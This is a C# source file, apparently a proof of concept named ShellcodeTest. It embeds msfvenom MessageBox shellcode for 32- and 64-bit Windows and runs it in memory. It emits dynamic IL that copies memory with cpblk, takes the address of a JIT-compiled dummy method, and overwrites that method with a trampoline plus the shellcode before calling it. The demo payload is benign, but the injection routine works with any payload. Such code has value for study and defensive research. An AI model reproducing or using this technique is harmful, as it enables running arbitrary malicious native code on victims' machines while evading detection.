using System;
using System.Diagnostics;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security;

namespace ShellcodeTest
{
    public class Program
    {
        static void Main(string[] args)
        {
            //msfvenom msgbox 64 bits
            byte[] sh64 = new byte[283] {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
            0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
            0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
            0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
            0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
            0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
            0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
            0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
            0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
            0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
            0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
            0x85,0x03,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
            0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x46,0x45,0x4c,
            0x41,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };
            
            //msfvenom msgbox 32 bits
            byte[] sh32 = new byte[257] {
            0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
            0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
            0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
            0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
            0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
            0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
            0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
            0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
            0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
            0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
            0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
            0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
            0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
            0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x6f,0x78,0x58,0x20,0x68,0x61,0x67,
            0x65,0x42,0x68,0x4d,0x65,0x73,0x73,0x31,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe3,
            0x68,0x58,0x20,0x20,0x20,0x68,0x46,0x45,0x4c,0x41,0x31,0xc9,0x88,0x4c,0x24,
            0x04,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,
            0x55,0x08 };
            Inject(sh64);
        }

        public static void Inject(byte[] shellcode)
        {

            //begin memcopy en msil
            AppDomain appD = AppDomain.CurrentDomain;
            AssemblyName assName = new AssemblyName("MethodSmasher");
            AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
            AllowPartiallyTrustedCallersAttribute attr = new AllowPartiallyTrustedCallersAttribute();
            ConstructorInfo csInfo = attr.GetType().GetConstructors()[0];
            object[] obArray = new object[0];
            CustomAttributeBuilder cAttrB = new CustomAttributeBuilder(csInfo, obArray);
            assBuilder.SetCustomAttribute(cAttrB);
            ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodSmasher");
            UnverifiableCodeAttribute codAttr = new UnverifiableCodeAttribute();
            csInfo = codAttr.GetType().GetConstructors()[0];
            CustomAttributeBuilder modCAttrB = new CustomAttributeBuilder(csInfo, obArray);
            mBuilder.SetCustomAttribute(modCAttrB);
            TypeBuilder tBuilder = mBuilder.DefineType("MethodSmasher", TypeAttributes.Public);
            Type[] allParams = { typeof(IntPtr),typeof(IntPtr),typeof(Int32) };
            MethodBuilder methodBuilder = tBuilder.DefineMethod("OverwriteMethod", MethodAttributes.Public | MethodAttributes.Static, null, allParams);
            ILGenerator generator = methodBuilder.GetILGenerator();

            generator.Emit(OpCodes.Ldarg_0);
            generator.Emit(OpCodes.Ldarg_1);
            generator.Emit(OpCodes.Ldarg_2);
            generator.Emit(OpCodes.Volatile);
            generator.Emit(OpCodes.Cpblk);
            generator.Emit(OpCodes.Ret);

            var smasherType = tBuilder.CreateType();
            var overWriteMethod = smasherType.GetMethod("OverwriteMethod");
            //end memcopy en msil

            //begin xor dummy method
            appD = AppDomain.CurrentDomain;
            assName = new AssemblyName("SmashMe");
            assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
            attr = new AllowPartiallyTrustedCallersAttribute();
            csInfo = attr.GetType().GetConstructors()[0];
            obArray = new object[0];
            cAttrB = new CustomAttributeBuilder(csInfo, obArray);
            assBuilder.SetCustomAttribute(cAttrB);
            mBuilder = assBuilder.DefineDynamicModule("SmashMe");
            codAttr = new UnverifiableCodeAttribute();
            csInfo = codAttr.GetType().GetConstructors()[0];
            modCAttrB = new CustomAttributeBuilder(csInfo, obArray);
            mBuilder.SetCustomAttribute(modCAttrB);
            tBuilder = mBuilder.DefineType("SmashMe", TypeAttributes.Public);
            Int32 xorK = 0x41424344;
            Type[] allParams2 = {typeof(Int32) };
            methodBuilder = tBuilder.DefineMethod("OverwriteMe", MethodAttributes.Public | MethodAttributes.Static, typeof(Int32), allParams2);
            generator = methodBuilder.GetILGenerator();
            generator.DeclareLocal(typeof(Int32));
            generator.Emit(OpCodes.Ldarg_0);

            for(var x = 0; x < 101; x++)
            {
                generator.Emit(OpCodes.Ldc_I4, xorK);
                generator.Emit(OpCodes.Xor);
                generator.Emit(OpCodes.Stloc_0);
                generator.Emit(OpCodes.Ldloc_0);
            }

            generator.Emit(OpCodes.Ldc_I4, xorK);
            generator.Emit(OpCodes.Xor);
            generator.Emit(OpCodes.Ret);

            var smashmeType = tBuilder.CreateType();
            var overwriteMeMethod = smashmeType.GetMethod("OverwriteMe");
            //end xor dummy method


            //jit the xor method
            for (var x = 0; x < 21; x++)
            {
                try
                {
                    var i = overwriteMeMethod.Invoke(null, new object[] { 0x11112222 });
                    Console.WriteLine(i); //debug
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        string err = e.InnerException.Message;
                    }
                }
            }

            byte[] trap;


            if (IntPtr.Size == 4)
            {
                //32bits shcode
                trap = new byte[]{ 0x60, 0xe8, 0x04, 0, 0, 0, 0x61, 0x31, 0xc0, 0xc3 };
            }
            else
            {
                //64bits shcode
                trap = new byte[]{ 0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,0x31,0xC0,0xC3 };
            }

            byte[] finalShellcode = new byte[trap.Length + shellcode.Length];
            Buffer.BlockCopy(trap, 0, finalShellcode, 0, trap.Length);
            Buffer.BlockCopy(shellcode, 0, finalShellcode, trap.Length, shellcode.Length);

            IntPtr shellcodeAddress = Marshal.AllocHGlobal(finalShellcode.Length);

            Marshal.Copy(finalShellcode, 0, shellcodeAddress, finalShellcode.Length);

            IntPtr targetMethodAddress = getMethodAddress(overwriteMeMethod);

            object[] owParams = new object[] {targetMethodAddress, shellcodeAddress, finalShellcode.Length};
            try
            {
                overWriteMethod.Invoke(null, owParams);
            }
            catch (Exception e)
            {
                if (e.InnerException != null)
                {
                    string err = e.InnerException.Message;
                }
            }
            overwriteMeMethod.Invoke(null, new object[] { 0x11112222 });
        }

        public static IntPtr getMethodAddress(MethodInfo minfo)
        {

            IntPtr retAd = new IntPtr();
            Type typeBuilded;

            if (minfo.MethodImplementationFlags == MethodImplAttributes.InternalCall)
            {
                return IntPtr.Zero;
            }

            try
            {
                typeBuilded = Type.GetType("MethodLeaker", true);
            }
            catch
            {
                AppDomain appD = AppDomain.CurrentDomain;
                AssemblyName assName = new AssemblyName("MethodLeakAssembly");
                AssemblyBuilder assBuilder = appD.DefineDynamicAssembly(assName, AssemblyBuilderAccess.Run);
                ModuleBuilder mBuilder = assBuilder.DefineDynamicModule("MethodLeakModule");
                TypeBuilder tBuilder = mBuilder.DefineType("MethodLeaker", TypeAttributes.Public);

                MethodBuilder metBuilder;
                if (IntPtr.Size == 4)
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);

                }
                else
                {
                    metBuilder = tBuilder.DefineMethod("LeakMethod", MethodAttributes.Public | MethodAttributes.Static, typeof(IntPtr), null);
                }

                ILGenerator ilGen = metBuilder.GetILGenerator();

                ilGen.Emit(OpCodes.Ldftn, minfo);
                ilGen.Emit(OpCodes.Ret);

                typeBuilded = tBuilder.CreateType();
            }
            MethodInfo methodInfoBuilded = typeBuilded.GetMethod("LeakMethod");             
                try
                {
                    var obj = methodInfoBuilded.Invoke(null, null);
                    retAd = (IntPtr)obj;
                }
                catch(Exception e)
                {
                    Console.WriteLine(methodInfoBuilded.Name + " cannot return an unmanaged address.");
                }
            return retAd;
        }

    }
}